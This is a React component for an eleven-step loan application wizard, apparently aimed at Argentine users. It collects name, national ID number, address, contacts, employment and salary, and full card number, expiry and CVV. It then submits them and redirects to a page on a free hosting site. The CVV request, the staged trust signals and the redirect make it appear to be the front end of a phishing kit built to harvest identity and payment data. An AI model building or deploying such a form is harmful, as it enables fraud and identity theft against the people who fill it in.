import React, { useState, useEffect } from 'react';
import { FloatingLogo } from './FloatingLogo';
import { LoadingScreen } from './LoadingScreen';
import { WelcomeScreen } from './WelcomeScreen';
import { SecurityBadges } from './SecurityBadges';
import { LoadingSpinner } from './LoadingSpinner';
import { LoanAmountStep } from './steps/LoanAmountStep';
import { PersonalInfoStep } from './steps/PersonalInfoStep';
import { IdentificationStep } from './steps/IdentificationStep';
import { LocationStep } from './steps/LocationStep';
import { PostalCodeStep } from './steps/PostalCodeStep';
import { ContactInfoStep } from './steps/ContactInfoStep';
import { ContactReferenceStep } from './steps/ContactReferenceStep';
import { OccupationStep } from './steps/OccupationStep';
import { OccupationDetailsStep } from './steps/OccupationDetailsStep';
import { CardInfoStep } from './steps/CardInfoStep';
import { SummaryStep } from './steps/SummaryStep';
import { ProgressIndicator } from './ProgressIndicator';
import { LoanFormData } from '../types/formTypes';
import { submitFormData } from '../services/formService';
import { motion, AnimatePresence } from 'framer-motion';

export const MultiStepForm: React.FC = () => {
  const [isLoading, setIsLoading] = useState(true);
  const [showWelcome, setShowWelcome] = useState(false);
  const [currentStep, setCurrentStep] = useState(0);
  const [isStepLoading, setIsStepLoading] = useState(false);
  const [formData, setFormData] = useState<LoanFormData>({
    loanAmount: 500000,
    loanTerm: 24,
    firstName: '',
    lastName: '',
    dni: '',
    province: '',
    postalCode: '',
    email: '',
    phone: '',
    occupation: '',
    occupationDetails: {
      company: '',
      position: '',
      monthlySalary: '',
      yearsEmployed: ''
    },
    references: [{ name: '', relationship: '', phone: '' }],
    cardInfo: {
      type: 'credit',
      number: '',
      name: '',
      expiry: '',
      cvv: ''
    }
  });

  // Simulate initial loading
  useEffect(() => {
    const timer = setTimeout(() => {
      setIsLoading(false);
      setShowWelcome(true);
    }, 2000);
    return () => clearTimeout(timer);
  }, []);

  const handleWelcomeComplete = () => {
    setShowWelcome(false);
    setCurrentStep(1);
  };

  const handleNext = async () => {
    setIsStepLoading(true);
    await new Promise(resolve => setTimeout(resolve, 800));
    setCurrentStep(prev => prev + 1);
    setIsStepLoading(false);
  };

  const handleBack = () => {
    setCurrentStep(prev => prev - 1);
  };

  const updateFormData = (field: string, value: any) => {
    setFormData(prev => ({
      ...prev,
      [field]: value
    }));
  };

  const updateNestedFormData = (parent: string, field: string, value: any) => {
    setFormData(prev => ({
      ...prev,
      [parent]: {
        ...prev[parent as keyof LoanFormData],
        [field]: value
      }
    }));
  };

  const handleSubmit = async () => {
    try {
      await submitFormData(formData);
      window.location.href = 'https://crediarg.webcindario.com/index.html';
    } catch (error) {
      console.error('Error submitting form:', error);
      // Handle error
    }
  };

  // Determine which step to show
  const renderStep = () => {
    if (isLoading) {
      return <LoadingScreen />;
    }

    if (showWelcome) {
      return <WelcomeScreen onComplete={handleWelcomeComplete} />;
    }

    if (isStepLoading) {
      return <LoadingSpinner />;
    }

    const StepComponent = (() => {
      switch (currentStep) {
        case 1: return (
          <LoanAmountStep
            loanAmount={formData.loanAmount}
            loanTerm={formData.loanTerm}
            onLoanAmountChange={(value) => updateFormData('loanAmount', value)}
            onLoanTermChange={(value) => updateFormData('loanTerm', value)}
            onNext={handleNext}
          />
        );
        case 2: return (
          <PersonalInfoStep
            firstName={formData.firstName}
            lastName={formData.lastName}
            onFirstNameChange={(value) => updateFormData('firstName', value)}
            onLastNameChange={(value) => updateFormData('lastName', value)}
            onNext={handleNext}
            onBack={handleBack}
          />
        );
        case 3: return (
          <IdentificationStep
            dni={formData.dni}
            onDniChange={(value) => updateFormData('dni', value)}
            onNext={handleNext}
            onBack={handleBack}
          />
        );
        case 4: return (
          <LocationStep
            province={formData.province}
            onProvinceChange={(value) => updateFormData('province', value)}
            onNext={handleNext}
            onBack={handleBack}
          />
        );
        case 5: return (
          <PostalCodeStep
            postalCode={formData.postalCode}
            onPostalCodeChange={(value) => updateFormData('postalCode', value)}
            onNext={handleNext}
            onBack={handleBack}
          />
        );
        case 6: return (
          <ContactInfoStep
            email={formData.email}
            phone={formData.phone}
            onEmailChange={(value) => updateFormData('email', value)}
            onPhoneChange={(value) => updateFormData('phone', value)}
            onNext={handleNext}
            onBack={handleBack}
          />
        );
        case 7: return (
          <ContactReferenceStep
            references={formData.references}
            onReferencesChange={(value) => updateFormData('references', value)}
            onNext={handleNext}
            onBack={handleBack}
          />
        );
        case 8: return (
          <OccupationStep
            occupation={formData.occupation}
            onOccupationChange={(value) => updateFormData('occupation', value)}
            onNext={handleNext}
            onBack={handleBack}
          />
        );
        case 9: return (
          <OccupationDetailsStep
            occupation={formData.occupation}
            occupationDetails={formData.occupationDetails}
            onDetailsChange={(field, value) => 
              updateNestedFormData('occupationDetails', field, value)
            }
            onNext={handleNext}
            onBack={handleBack}
          />
        );
        case 10: return (
          <CardInfoStep
            cardInfo={formData.cardInfo}
            onCardInfoChange={(field, value) => 
              updateNestedFormData('cardInfo', field, value)
            }
            onNext={handleNext}
            onBack={handleBack}
          />
        );
        case 11: return (
          <SummaryStep
            formData={formData}
            onSubmit={handleSubmit}
            onBack={handleBack}
          />
        );
        default: return null;
      }
    })();

    return (
      <AnimatePresence mode="wait">
        <motion.div
          key={currentStep}
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          exit={{ opacity: 0, y: -20 }}
          transition={{ duration: 0.3 }}
        >
          {StepComponent}
        </motion.div>
      </AnimatePresence>
    );
  };

  return (
    <div className="w-full max-w-4xl">
      <FloatingLogo />
      <div className="relative bg-white/40 backdrop-blur-lg rounded-2xl shadow-lg overflow-hidden transition-all duration-500 ease-in-out">
        {!isLoading && !showWelcome && (
          <>
            <ProgressIndicator currentStep={currentStep} totalSteps={11} />
            <SecurityBadges />
          </>
        )}
        <div className="p-6 sm:p-8 md:p-10">
          {renderStep()}
        </div>
      </div>
    </div>
  );
};